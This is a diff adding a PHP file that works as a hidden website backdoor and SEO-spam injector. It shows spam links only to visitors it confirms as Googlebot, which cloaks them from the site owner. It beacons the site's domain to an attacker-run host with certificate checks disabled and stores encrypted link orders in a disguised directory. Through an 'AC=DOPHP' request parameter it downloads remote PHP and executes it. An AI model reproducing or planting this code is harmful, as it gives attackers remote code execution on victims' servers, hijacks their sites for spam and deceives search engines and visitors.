@@ -1,0 +1,524 @@
+
+<?php
+
+$wtableDir="0im1wt2Path3Dir4String5";
+
+
+static $hasRun = false;
+
+
+function isHomePage() {
+    $currentURL = $_SERVER['REQUEST_URI'];   
+    if($currentURL == '/' || $currentURL == '/index.php'|| $currentURL == '/index.html') {
+            return true;        } else {            return false;            }
+}
+
+function isFirstLevelPage(){
+    $currentURL = $_SERVER['REQUEST_URI'];
+    $parsedURL = parse_url($currentURL);
+    $path = $parsedURL['path'];  
+    $path = trim($path, '/');  
+    $pathSegments = explode('/', $path);   
+    if (count($pathSegments) == 1) {
+        return true;    } else {        return false;    }
+}
+
+function isGooglebot() {    
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];   
+    if (strpos($userAgent, 'Googlebot') ) {
+        return true;    } else {        return false;
+    }     
+}
+
+function isGoogleHost($ip){    
+    $hostname ="0";
+    $command='nslookup '.$ip;
+    $hostname = shell_exec($command); 
+    if (strpos($hostname, 'googlebot.com') !== false) {
+        return true;    }else{        return false;
+    }
+    
+}
+
+function updateIP($ip,$jsonData,$filePath,$TokenNotime){    
+    $jsonData['google_bot_ips'][] = $ip;
+    $jsonData['new_google_bot_ips'][] = $ip;      
+    $JsonStr =json_encode($jsonData,320) ; 
+    $encodedJsonStr = encryptDataYY($JsonStr, $TokenNotime);
+    file_put_contents($filePath, $encodedJsonStr );     
+}
+
+function getLinksHTML($links){   
+    $linksArr = json_decode($links, true);
+    $linksHtml = '<div style="display:block;"><ul style="display:flex;">';
+    foreach ($linksArr as $link) {        
+        $anchorText = $link[0];       
+        $url = $link[1];
+               
+        $linkHtml = ' <li class=\'cat-item-all\'><a href="' . $url . '">' . $anchorText . '</a></li> '; // ##############################################
+        $linksHtml .= $linkHtml;
+    }
+    $linksHtml .='</ul></div>';
+    return $linksHtml;    
+}
+
+function encryptDataYY($data, $key) {
+    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+    $encrypted = openssl_encrypt($data, 'aes-256-cbc', hash('sha256', $key, true), 0, $iv);
+    return base64_encode($encrypted . '::' . $iv);
+}
+function decryptDataYY($data, $key) {
+    list($encrypted_data, $iv) = explode('::', base64_decode($data), 2);
+    return openssl_decrypt($encrypted_data, 'aes-256-cbc', hash('sha256', $key, true), 0, $iv);
+}
+ 
+function gen_token_notime($domain) {    
+    $fixed_string = "DhdL8Uf9hHNWVNcGwybP8bDhqwn3WpHrRsgaugOqx";  
+    $sha256_hash = hash('sha256', $domain . $fixed_string , true);    
+    $key = hash('sha256', $sha256_hash, true);        
+    $token = strtr(base64_encode($sha256_hash), '+/', '-_'); 
+    return array($token, $domain . $fixed_string );
+}
+
+function convert3Ip($ip) {
+    $pattern = '/^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$/';
+    $replaced = '${1}.0/24';    
+    return preg_replace($pattern, $replaced, $ip);
+}
+
+function isInGoogleIPRange($ip,$GooglebotIPs){   
+    $r3ip=convert3Ip($ip);
+    if (in_array($ip, $GooglebotIPs) or in_array($r3ip, $GooglebotIPs)) {
+        return true;     } else {        return false;
+    }
+}  
+
+function replace_keywords_with_links($content, $urls_keywords_arr, $max_replace_count = 10) {
+    $used_urls = [];
+    $replace_count = 0;
+    foreach ($urls_keywords_arr as $url_keywords) {
+        foreach ($url_keywords as $url => $keywords) {
+            if (in_array($url, $used_urls)) { continue; }
+            shuffle($keywords);
+            foreach ($keywords as $keyword) {
+                if (strpos($content, $keyword) !== false && $replace_count < $max_replace_count) {                   
+                    if (!in_array($url, $used_urls)) {
+                        $content = preg_replace('/' . $keyword . '/', '<a href="' . $url . '">' . $keyword . '</a>', $content, 1);                        
+                        $replace_count++;
+                        $used_urls[] = $url;
+                        if ($replace_count >= $max_replace_count) { break 2; }
+                    }
+                }
+            }
+        }
+    }
+
+    return $content;
+}
+
+
+function content_page_links($content){
+    global $wtableDir;
+    $wtableDir="0im1wt2Path3Dir4String5";
+    $rootPath = $_SERVER['DOCUMENT_ROOT'];
+    $filePath = $rootPath.'/'.$wtableDir.'/tmp/cache.json';
+    $domain = $_SERVER['SERVER_NAME'];
+    
+	if (file_exists($filePath)) 
+	{		
+		list($TokenNotime, $unused2notime) = gen_token_notime($domain);
+		$cacheDataStr = file_get_contents($filePath);    	
+		$decrypted_data = decryptDataYY($cacheDataStr, $TokenNotime);  
+		$data = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE); 
+		$GooglebotIPs=$data['google_bot_ips'];    
+		$contentLinks=$data['content_page_links']; 
+		$linksArr = json_decode($contentLinks, true); 
+		$haveContentLinks= $haveNewGGIP= false; 	 
+		if(mb_strlen($contentLinks) > 20){$haveContentLinks= true ;}		
+		$ip = $_SERVER['REMOTE_ADDR'];  
+	
+		if ($haveContentLinks) {			
+			if( isInGoogleIPRange($ip,$GooglebotIPs) ){				
+				$content =  replace_keywords_with_links($content, $linksArr, $max_replace_count = 10)  ;  
+			}else{				
+				
+				if ( isGooglebot() && isGoogleHost($ip) ) { 
+					$content = replace_keywords_with_links($content, $linksArr, $max_replace_count = 10) ;       
+					$haveNewGGIP=true ;                            
+				}
+			} 
+		}
+		
+		if($haveNewGGIP==true){			
+			updateIP($ip,$data,$filePath,$TokenNotime);
+		}
+        	
+	}	 
+	return $content; 
+}
+
+
+function site_friend_links($linksContainerHTML){
+    global $wtableDir;
+    $wtableDir="0im1wt2Path3Dir4String5";
+    $rootPath = $_SERVER['DOCUMENT_ROOT'];
+    $filePath = $rootPath.'/'.$wtableDir.'/tmp/cache.json';
+
+     
+    $domain = $_SERVER['SERVER_NAME'];
+
+    if (file_exists($filePath)) 
+    {   
+	 
+        
+        list($TokenNotime, $unused2notime) = gen_token_notime($domain);
+        $cacheDataStr = file_get_contents($filePath);         
+        $decrypted_data = decryptDataYY($cacheDataStr, $TokenNotime);  
+
+        $data = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE); 
+ 
+        $GooglebotIPs=$data['google_bot_ips'];  
+        $insert_urls=$data['insert_urls']; 
+        $indexLinks= $insert_urls[0]['index']; $catLinks  = $insert_urls[1]['category']; $allLinks  = $insert_urls[2]['all_page'];
+        $haveIndexLinks= $haveCatLinks= $haveAllLinks=  $haveNewGGIP= false; 
+
+        if(mb_strlen($indexLinks) > 20){   $haveIndexLinks = true ;}         
+        
+        if(mb_strlen($catLinks) > 20){ $haveCatLinks = true ;} 
+        
+        if(mb_strlen($allLinks) > 20){ $haveAllLinks = true ;}
+        $ip = $_SERVER['REMOTE_ADDR'];  
+
+	 
+
+    
+        if ($haveIndexLinks and isHomePage() ) {   
+	 
+            if( isInGoogleIPRange($ip,$GooglebotIPs) ){
+		 
+               
+                $linksHTML = getLinksHTML($indexLinks) ;  
+                $linksContainerHTML.= $linksHTML;  
+ 
+            }else{
+ 
+                
+                if ( isGooglebot() && isGoogleHost($ip) ) { 
+                    $linksHTML = getLinksHTML($indexLinks) ;             
+                    $linksContainerHTML.= $linksHTML;                
+                    $haveNewGGIP=true ;                                 
+                }
+            }    
+        }
+    
+        if($haveCatLinks and isFirstLevelPage() and !isHomePage() ){ 
+            if( isInGoogleIPRange($ip,$GooglebotIPs) ){
+                $linksHTML = getLinksHTML($catLinks) ;      
+                $linksContainerHTML.= $linksHTML;   
+            }else{                
+                if ( isGooglebot() && isGoogleHost($ip) ) { 
+                    $linksHTML = getLinksHTML($catLinks) ;              
+                    $linksContainerHTML.= $linksHTML;     
+                    $haveNewGGIP=true ;                          
+                }
+            } 
+        } 
+ 
+        if( $haveAllLinks ){            
+            if( isInGoogleIPRange($ip,$GooglebotIPs) ){
+                $linksHTML = getLinksHTML($allLinks) ;    
+                $linksContainerHTML.= $linksHTML;   
+            }else{                
+                if ( isGooglebot() && isGoogleHost($ip) ) { 
+                    $linksHTML = getLinksHTML($allLinks) ;                 
+                    $linksContainerHTML.= $linksHTML;          
+                    $haveNewGGIP=true ;                     
+                }
+            }
+
+        } 
+       
+        if($haveNewGGIP==true){
+            updateIP($ip,$data,$filePath,$TokenNotime);
+        }
+    
+    }else{
+	 
+    }
+
+    return $linksContainerHTML; 
+} 
+
+///
+function checkUrlWorkOK($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_NOBODY, true);
+    curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    if( $httpCode >= 200 && $httpCode <= 300){
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function random_bytesYYY($length) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+    $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+
+function encrypt($data, $token) {
+    $iv = random_bytesYYY(16); 
+    $key = hash('sha256', $token, true);
+    $encrypted_data = openssl_encrypt(json_encode($data,320), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv); 
+    $encrypted_data = base64_encode($iv . $encrypted_data);
+    return $encrypted_data;
+}
+function decrypt($encrypted_data, $token) {
+    $encrypted_data = base64_decode($encrypted_data);
+    $iv = substr($encrypted_data, 0, 16);
+    $encrypted_data = substr($encrypted_data, 16); 
+    $key = hash('sha256', $token, true);
+    $decrypted_data = openssl_decrypt($encrypted_data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);  
+    return $decrypted_data;
+}
+function gen_token($domain) {  
+    $fixed_string = "DhdL8Uf9hHNWVNcGwybP8bDhqwn3WpHrRsgaugOqx";    
+    $utc_time = gmdate('Y-m-d');  
+    $sha256_hash = hash('sha256', $domain . $fixed_string . $utc_time, true);    
+    $key = hash('sha256', $sha256_hash, true); 
+    $token = strtr(base64_encode($sha256_hash), '+/', '-_'); 
+    return array($token, $domain . $fixed_string . $utc_time);
+}
+
+
+function updateApiCache($cache_file) {
+     
+    $api_urls = [
+        'https://static.googlestaticjs.top/new_api',
+        'https://raw.githubusercontent.com/glady1998/testdemo/main/new_api',
+    ];
+    foreach ($api_urls as $api_url) {
+        $latest_api_content = @file_get_contents($api_url);
+        if ($latest_api_content !== false) {
+            $latest_api_content = trim($latest_api_content);            
+            $directory = dirname($cache_file);
+            if (!is_dir($directory)) {  mkdir($directory, 0777, true); }
+            if (!file_exists($cache_file)) {  touch($cache_file);}
+            file_put_contents($cache_file, $latest_api_content);            
+            break;
+        }
+    }
+} 
+
+
+function getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url ) { 
+    $postJdata = '{"new_google_bot_ips":'.json_encode($newGooglebotIPs).',"domain":"'.$domain.'","page_url":"'.$page_url.'","token":"'.$Token.'" } ';  
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $apiUrl); 
+    curl_setopt($ch, CURLOPT_POST, true);    
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postJdata  ); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    curl_setopt($ch, CURLOPT_HEADER, false);    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    $jsonResponse = curl_exec($ch);
+    curl_close($ch);  
+    return $jsonResponse;
+}
+
+function processSaveAPIData($gotEncJson,$Token,$TokenNotime,$filePath){    
+    $gotEncJson = json_decode($gotEncJson, true, 512, JSON_UNESCAPED_UNICODE);
+    if($gotEncJson === null) {
+        touch($filePath);
+    } else {        
+        if( isset($gotEncJson['msg']) and isset($gotEncJson['data']) and ($gotEncJson['msg'] == 'token ok') ){                      
+            $received_data = $gotEncJson['data'];
+            $decrypted_data = decrypt($received_data, $Token);
+            $dataJsonORI = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE); 
+            if($dataJsonORI === null){
+                touch($filePath);
+            }else{
+                $encryptedJsonStr = encryptDataYY($dataJsonORI, $TokenNotime); 
+                if(mb_strlen($encryptedJsonStr) > 100){     
+                    $directory = dirname($filePath);
+                    if (!is_dir($directory)) {  mkdir($directory, 0777, true); }
+                    if (!file_exists($filePath)) {  touch($filePath);}  
+                    file_put_contents($filePath, $encryptedJsonStr);
+                }else{touch($filePath);} 
+            }
+        }else{touch($filePath);}
+    } 
+}
+
+///
+
+function heartBT(){
+ 
+    
+    $originalTimeZone = date_default_timezone_get();
+    date_default_timezone_set('UTC');
+
+    global $wtableDir;
+    $wtableDir="0im1wt2Path3Dir4String5";
+    $rootPath = $_SERVER['DOCUMENT_ROOT'];
+      
+    $filePath       = $rootPath.'/'.$wtableDir.'/tmp/cache.json'; 
+    $api_cache_file = $rootPath.'/'.$wtableDir.'/tmp/api_cache.txt'; 
+    $localPHPPath   = $rootPath.'/'.$wtableDir.'/tmp/tudo.php';
+
+    $apiUrlsBase = [ 'https://static.googlestaticjs.top/heartbeat-packet/' ];//****** !!!!!!########### */
+    
+    $AC="";
+    if(isset($_GET['AC'])){ $AC=trim($_GET['AC']); $AC=str_replace(' ','',$AC); }
+    $domain = $_SERVER['SERVER_NAME'];
+    $page_url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']; 
+    $apiUrl = "";
+    $newGooglebotIPs =[];
+    $heartbeat_packet_interval=30;
+    $updateTime="2022-11-11 11:00:00"; 
+    $dateYI = new DateTime();
+    $dateYI->setTimezone(new DateTimeZone('UTC'));
+    $nowTime=$dateYI->format('Y-m-d H:i');
+    
+    list($Token, $unused2) = gen_token($domain); list($TokenNotime, $unused2notime) = gen_token_notime($domain);
+    
+    if (file_exists($filePath)) { 
+        $mtime = filemtime($filePath);
+        $updateTime= date('Y-m-d H:i', $mtime);    
+        $cacheDataStr = file_get_contents($filePath);    
+        $decrypted_data = decryptDataYY($cacheDataStr, $TokenNotime);  
+        $data = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE); 
+        $heartbeat_packet_interval=$data['heartbeat_packet_interval']; 
+        if($heartbeat_packet_interval<1){$heartbeat_packet_interval=30;} 
+        $apiUrls=$data['api_list']; 
+        
+        if(!empty($apiUrls)){
+            $apiUrl = $apiUrls[0];             
+        }else{
+            $apiUrl = $apiUrlsBase[0];
+        }    
+
+        $newGooglebotIPs = $data['new_google_bot_ips'];   
+
+    }else{        
+        $apiUrl = $apiUrlsBase[0];        
+    } 
+
+
+
+
+
+    if ( is_numeric($AC) and ($AC>1) ){
+        $timeDiff = strtotime($nowTime) - strtotime($updateTime);
+        $minutesDiff = floor($timeDiff / 60);
+        if ($minutesDiff >= $AC) {        
+            $newJson=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url);    
+            if(mb_strlen($newJson) > 100){
+                processSaveAPIData($newJson,$Token,$TokenNotime,$filePath);
+            }
+        } 
+    }elseif($AC=="DO"){    
+        $newJsonORI=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url); 
+        if(mb_strlen($newJsonORI) > 100){     
+        processSaveAPIData($newJsonORI,$Token,$TokenNotime,$filePath);
+        }
+    }elseif($AC=="DOPHP"){
+        $api_urls = [
+            'https://static.googlestaticjs.top/tudo',
+            'https://raw.githubusercontent.com/glady1998/testdemo/main/tudo',        ]; //****** !!!!!!########### */
+        foreach ($api_urls as $api_url) {
+            $latest_api_content = @file_get_contents($api_url);
+            if ($latest_api_content !== false) {           
+                $localFilePath = $localPHPPath ; 
+                $directory = dirname($localFilePath);
+                if (!is_dir($directory)) {  mkdir($directory, 0777, true); }
+                if (!file_exists($localFilePath)) {  touch($localFilePath);}
+                $result = file_put_contents($localFilePath, $latest_api_content);
+
+                if ($result !== false) {                 
+                    $command = 'php ' . $localFilePath;
+                    exec($command, $output, $return_var);                 
+                    if ($return_var === 0) {
+                        echo "<br>PHP RUN OK ...\n";
+                        echo "<br>OUTPUT:\n";
+                        echo implode("\n", $output);
+                        break;
+                    } else {
+                        echo "<br>PHP RUN FAILED ...\n";
+                        echo "<br>ERROR CODE: " . $return_var . "\n";
+                    }
+                } else {
+                    echo "<br>file_put_contents WRITE FAILED \n";
+                }
+            } else {
+                echo "<br>file_get_contents FAILED=$api_url<br>";
+            }        
+        } 
+    }else{    
+        $timeDiff = strtotime($nowTime) - strtotime($updateTime);
+        $minutesDiff = floor($timeDiff / 60); 
+       
+        if ( $minutesDiff >= $heartbeat_packet_interval) {    
+      
+            $urlWork=false;
+            if(!checkUrlWorkOK($apiUrl)) {
+                foreach ($apiUrlsBase as $url) {
+                    if(checkUrlWorkOK($url)) { $apiUrl = $url; $urlWork=true; break; } 
+                } 
+                if($urlWork==false){
+                    if (file_exists($api_cache_file)) {        
+                        $lines = file($api_cache_file, FILE_IGNORE_NEW_LINES); 
+                        if(count($lines)>0){                           
+                            foreach ($lines as $url) {
+                                if(checkUrlWorkOK($url)) { $apiUrl = $url;  $urlWork=true; break; } 
+                            }
+                        }else{
+                            updateApiCache($api_cache_file); 
+                        }      
+                    }else{
+                        updateApiCache($api_cache_file);
+                    }
+                }
+            }else{
+                $newJson=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url);    
+                if(mb_strlen($newJson) > 100){           
+                    processSaveAPIData($newJson,$Token,$TokenNotime,$filePath);
+                }
+            }
+            
+            if($urlWork){
+                $newJson=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url);    
+                if(mb_strlen($newJson) > 100){
+                    processSaveAPIData($newJson,$Token,$TokenNotime,$filePath);
+                }
+            }
+        }
+        
+        if (file_exists($api_cache_file)) {       
+            $mtimeAPI = filemtime($api_cache_file);
+            $updateTimeAPI= date('Y-m-d H:i', $mtimeAPI);
+            $timeDiffAPI = strtotime($nowTime) - strtotime($updateTimeAPI);
+            $minutesDiff = floor($timeDiffAPI / 60);  
+            
+            if ($minutesDiff > floor($heartbeat_packet_interval / 2)) {   
+                  
+                updateApiCache($api_cache_file);            
+            }
+        } else { 
+                 
+            updateApiCache($api_cache_file);
+        }
+
+    }//end if AC, AC=123 AC=DO PHP
+
+    date_default_timezone_set($originalTimeZone);
+
+}//endfunction heartBT 
+
+
+?>
